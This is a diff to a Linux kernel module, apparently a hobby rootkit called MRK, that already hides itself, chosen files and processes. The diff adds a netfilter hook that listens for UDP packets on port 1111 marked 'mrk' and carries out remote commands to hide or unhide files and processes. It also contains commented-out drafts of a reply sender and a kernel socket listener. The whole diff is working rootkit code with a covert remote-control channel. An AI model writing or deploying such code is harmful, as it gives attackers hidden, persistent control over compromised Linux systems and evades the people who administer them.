@@ -7,6 +7,15 @@
 #include <linux/sched/task.h>
 #include <linux/kernel.h>
 #include <linux/slab.h>
+#include <linux/net.h>
+#include <linux/socket.h>
+#include <linux/kthread.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <net/net_namespace.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/udp.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Yanay Goor");
@@ -17,6 +26,7 @@ static struct list_head *modules;
 
 static char *test_path_name = "/home/yanayg/test_file";
 static char *test_path_name2 = "/home/yanayg/test_file2";
+//static struct socket *cmd_socket = NULL;
 static unsigned long proc_ino = 0;
 
 static void hide_module(void) {
@@ -390,8 +400,191 @@ static int unhide_file(const char *path_name) {
 	return free_fops_hook(inode);
 }
 
+struct cmd_type {
+    char *name;
+    int (*func)(const char *path);
+};
+
+static void MRK_exit(void) {
+    unhide_module();
+	printk(KERN_INFO "Goodbye, World!\n");
+}
+
+static int exit_func(const char *_) {
+    MRK_exit();
+    return 0;
+}
+
+int cmds_len = 5;
+int cmd_port = 1111;
+char *cmd_magic = "mrk";
+struct cmd_type cmds[] = {
+    {
+        "hfile",
+        hide_file
+    },
+    {
+        "ufile",
+        unhide_file
+    },
+    {
+        "hproc",
+        hide_process
+    },
+    {
+        "uproc",
+        unhide_process
+    },
+    {
+        "fexit",
+        exit_func
+    }
+};
+
+static int match_cmd(struct cmd_type *cmd, const char *data) {
+    return strncmp(data, cmd->name, strlen(cmd->name));
+}
+
+static int call_cmd(struct cmd_type *cmd, const char *data, unsigned int data_len) {
+    char *new_data;
+    int result;
+    new_data = kmalloc(data_len + 1, GFP_KERNEL);
+    memcpy(new_data, data, data_len);
+    result = cmd->func(new_data + strlen(cmd->name));
+    kfree(new_data);
+    return result;
+}
+
+//static int send_response(int response_status) {
+//    struct iphdr *iph;
+//    struct udphdr *udph;
+//    struct sk_buff *skb;
+//    skb = alloc_skb(len, GFP_ATOMIC);
+//    if (!skb)
+//        return -1;
+//    skb_push(skb, sizeof(*udph));
+//    skb_reset_transport_header(skb);
+//    udph = udp_hdr(skb);
+    //udph->source = htons(....);
+    //udph->dest = htons(...);
+    //udph->len = htons(udp_len);
+    //udph->check = 0;
+    //udph->check = csum_tcpudp_magic(local_ip,
+    //                                remote_ip,
+    //                                udp_len, IPPROTO_UDP,
+    //                                csum_partial(udph, udp_len, 0));
+    //
+    //if (udph->check == 0)
+    //        udph->check = CSUM_MANGLED_0;
+    //
+    //skb_push(skb, sizeof(*iph));
+    //skb_reset_network_header(skb);
+    //iph = ip_hdr(skb);
+    //
+    ///* iph->version = 4; iph->ihl = 5; */
+    //put_unaligned(0x45, (unsigned char *)iph);
+    //iph->tos      = 0;
+    //put_unaligned(htons(ip_len), &(iph->tot_len));
+    //iph->id       = htons(atomic_inc_return(&ip_ident));
+    //iph->frag_off = 0;
+    //iph->ttl      = 64;
+    //iph->protocol = IPPROTO_UDP;
+    //iph->check    = 0;
+    //put_unaligned(local_ip, &(iph->saddr));
+    //put_unaligned(remote_ip, &(iph->daddr));
+    //iph->check    = ip_fast_csum((unsigned char *)iph, iph->ihl);
+    //
+    //eth = (struct ethhdr *) skb_push(skb, ETH_HLEN);
+    //skb_reset_mac_header(skb);
+    //skb->protocol = eth->h_proto = htons(ETH_P_IP);
+    //memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
+    //memcpy(eth->h_dest, remote_mac, ETH_ALEN);
+    //
+    //skb->dev = dev;
+    //
+    //
+    //dev_queue_xmit(skb);
+//}
+
+static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
+    struct iphdr *iph;
+    struct udphdr *udph;
+    const char *user_data;
+    int i;
+    int result;
+
+    iph = ip_hdr(skb);
+    if (iph->protocol != IPPROTO_UDP) return NF_ACCEPT;
+
+    udph = udp_hdr(skb);
+    if (ntohs(udph->dest) != cmd_port) return NF_ACCEPT;
+
+    #ifdef NET_SKBUFF_DATA_USES_OFFSET
+    user_data = skb->head + skb->tail - ntohs(udph->len) + sizeof(struct udphdr);
+    #else
+    user_data = skb->tail - ntohs(udph->len) + sizeof(struct udphdr);
+    #endif
+
+    if (strncmp(user_data, cmd_magic, strlen(cmd_magic))) return NF_ACCEPT;
+
+    for (i = 0; i < cmds_len; i++) {
+        if (!match_cmd(cmds + i, user_data + strlen(cmd_magic))) {
+            result = call_cmd(cmds + i, user_data + strlen(cmd_magic), ntohs(udph->len) - sizeof(struct udphdr));
+            printk(KERN_INFO "Found %s cmd packet! executed with code %d", cmds[i].name, result);
+            alloc_skb(sizeof(struct iphdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + 10, GFP_KERNEL);
+            break;
+        }
+    }
+    return NF_DROP;
+}
+
+struct nf_hook_ops *net_hook;
+
+static int MRK_init_nethook(void) {
+    net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
+    net_hook->hook = MRK_hookfn;
+    net_hook->hooknum = NF_INET_PRE_ROUTING;
+    net_hook->pf = PF_INET;
+    net_hook->priority = NF_IP_PRI_FILTER;
+    return nf_register_net_hook(&init_net, net_hook);
+}
+
+//static int MRK_thread_fn(void *data) {
+//    int retval;
+//    int length;
+//    struct kvec iov;
+//    struct msghdr cmd_msg;
+//    void *buffer;
+//    struct sockaddr_in addr = {
+//	    AF_INET,
+//	    htons(1111),
+//	    {INADDR_ANY}
+//	};
+//    printk(KERN_INFO "started kthread");
+//    buffer = kmalloc(2048, GFP_KERNEL);
+//    if ((retval = sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &cmd_socket))) {
+//	    return retval;
+//	}
+//    printk(KERN_INFO "created socket in kthread");
+//	iov.iov_base = buffer;
+//	iov.iov_len = 2048;
+////	int kernel_recvmsg(struct socket *sock, struct msghdr *msg, struct kvec *vec, size_t num, size_t size, int flags);
+//	if ((retval = kernel_bind(cmd_socket, (struct sockaddr *) &addr, sizeof(struct sockaddr_in)))) {
+//        printk(KERN_INFO "binding failed with status %d", retval);
+//	    return retval;
+//	}
+//    printk(KERN_INFO "bounded socket");
+//	while(1) {
+//	    length = kernel_recvmsg(cmd_socket, &cmd_msg, &iov, 1, 2048, 0);
+//	    printk(KERN_INFO "recived msg with len %d", length);
+//	}
+//
+//}
+
 
 static int __init MRK_initialize(void) {
+//    struct task_struct *MRK_kthread;
+    MRK_init_nethook();
     init_hidden_processes();
 	hide_file(test_path_name);
 	hide_file(test_path_name2);
@@ -399,14 +592,11 @@ static int __init MRK_initialize(void) {
     hide_process("/bin/ps");
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
+//	MRK_kthread = kthread_create(MRK_thread_fn, 0, "MRK thread");
+//	wake_up_process(MRK_kthread);
 	return 0;
 }
 
-
-static void __exit MRK_exit(void) {
-    unhide_module();
-	printk(KERN_INFO "Goodbye, World!\n");
-}
 
 module_init(MRK_initialize);
 module_exit(MRK_exit);
